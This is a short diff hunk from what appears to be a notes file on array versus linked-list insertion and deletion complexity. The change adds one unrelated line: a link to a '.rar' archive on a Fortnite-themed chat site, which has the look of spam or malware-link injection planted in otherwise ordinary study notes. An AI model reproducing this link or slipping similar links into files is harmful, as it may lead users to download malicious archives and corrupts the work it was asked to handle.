@@ -52,5 +52,5 @@ Linked List:
 | Insertion          | O(N) (O(1) at end)      | O(N) (O(1) at beginning) 
 | Deletion           | O(N) (O(1) at end)      | O(N) (O(1) at beginning) 
 
-
+https://fortnitechat.site/join.php?id=YWTUP1.rar
 
